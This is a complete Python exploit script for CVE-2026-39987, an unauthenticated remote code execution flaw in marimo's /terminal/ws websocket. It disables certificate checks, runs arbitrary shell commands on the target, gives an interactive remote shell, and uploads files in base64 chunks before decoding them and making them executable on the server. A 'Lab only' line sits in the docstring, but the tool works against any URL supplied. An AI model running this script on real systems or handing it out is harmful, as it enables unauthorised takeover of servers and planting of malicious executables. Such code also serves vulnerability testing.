#!/usr/bin/env python3
"""
CVE-2026-39987 — marimo unauthenticated /terminal/ws PTY RCE helper

Usage:
  pip install websocket-client
  python3 marimo_terminal_rce.py --url wss://target/terminal/ws -c id
  python3 marimo_terminal_rce.py --url wss://target/terminal/ws -c 'uname -a' -c 'whoami'
  python3 marimo_terminal_rce.py --url wss://target/terminal/ws --interactive
  python3 marimo_terminal_rce.py --url wss://target/terminal/ws --upload local.py /tmp/x.py

Lab only. Plain-text commands + newline (not JSON frames).
"""
from __future__ import annotations

import argparse
import base64
import ssl
import sys
import time

import websocket


def connect(url: str, timeout: float = 15):
    ws = websocket.create_connection(
        url,
        sslopt={"cert_reqs": ssl.CERT_NONE},
        timeout=timeout,
    )
    ws.settimeout(0.35)
    for _ in range(80):
        try:
            ws.recv()
        except Exception:
            break
    return ws


def recv_all(ws, wait: float = 1.2) -> str:
    chunks = []
    end = time.time() + wait
    while time.time() < end:
        try:
            d = ws.recv()
            if isinstance(d, bytes):
                d = d.decode(errors="replace")
            chunks.append(d)
            end = max(end, time.time() + 0.25)
        except Exception:
            time.sleep(0.05)
    return "".join(chunks)


def run_cmd(ws, cmd: str, wait: float = 2.0) -> str:
    for _ in range(5):
        try:
            ws.recv()
        except Exception:
            break
    ws.send(cmd if cmd.endswith("\n") else cmd + "\n")
    return recv_all(ws, wait=wait)


def upload_file(ws, local_path: str, remote_path: str, chunk_size: int = 900) -> None:
    data = open(local_path, "rb").read()
    b64 = base64.b64encode(data).decode()
    print(run_cmd(ws, f": > {remote_path}; echo TRUNC_OK", wait=1.0), flush=True)
    total = (len(b64) + chunk_size - 1) // chunk_size
    for i in range(total):
        part = b64[i * chunk_size : (i + 1) * chunk_size]
        out = run_cmd(
            ws,
            f"printf '%s' '{part}' >> {remote_path}; echo CHUNK_{i + 1}/{total}",
            wait=1.0,
        )
        if f"CHUNK_{i + 1}/{total}" not in out:
            print(f"[!] chunk {i + 1} ack missing", flush=True)
        if (i + 1) % 10 == 0 or i + 1 == total:
            print(f"[*] chunk {i + 1}/{total}", flush=True)
    out = run_cmd(
        ws,
        f"base64 -d {remote_path} > {remote_path}.bin && mv {remote_path}.bin {remote_path} && "
        f"chmod +x {remote_path} && wc -c {remote_path} && echo UPLOAD_OK",
        wait=3.0,
    )
    print(out, flush=True)
    if "UPLOAD_OK" not in out:
        raise SystemExit("upload failed")


def interactive(ws) -> None:
    print("[+] interactive PTY (Ctrl+C exit)", flush=True)
    while True:
        try:
            cmd = input("$ ")
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd:
            continue
        sys.stdout.write(run_cmd(ws, cmd, wait=2.5))
        sys.stdout.flush()


def main() -> None:
    ap = argparse.ArgumentParser(description="CVE-2026-39987 marimo /terminal/ws RCE")
    ap.add_argument("--url", required=True, help="wss://host/terminal/ws")
    ap.add_argument("-c", "--cmd", action="append", default=[], help="command (repeatable)")
    ap.add_argument("--upload", nargs=2, metavar=("LOCAL", "REMOTE"))
    ap.add_argument("--interactive", action="store_true")
    ap.add_argument("--wait", type=float, default=2.0)
    args = ap.parse_args()

    print(f"[*] {args.url}", flush=True)
    ws = connect(args.url)
    print("[+] connected", flush=True)

    if args.upload:
        upload_file(ws, args.upload[0], args.upload[1])

    for cmd in args.cmd:
        print(f"\n$ {cmd}", flush=True)
        print(run_cmd(ws, cmd, wait=args.wait), flush=True)

    if args.interactive or (not args.cmd and not args.upload):
        interactive(ws)

    try:
        ws.close()
    except Exception:
        pass


if __name__ == "__main__":
    main()
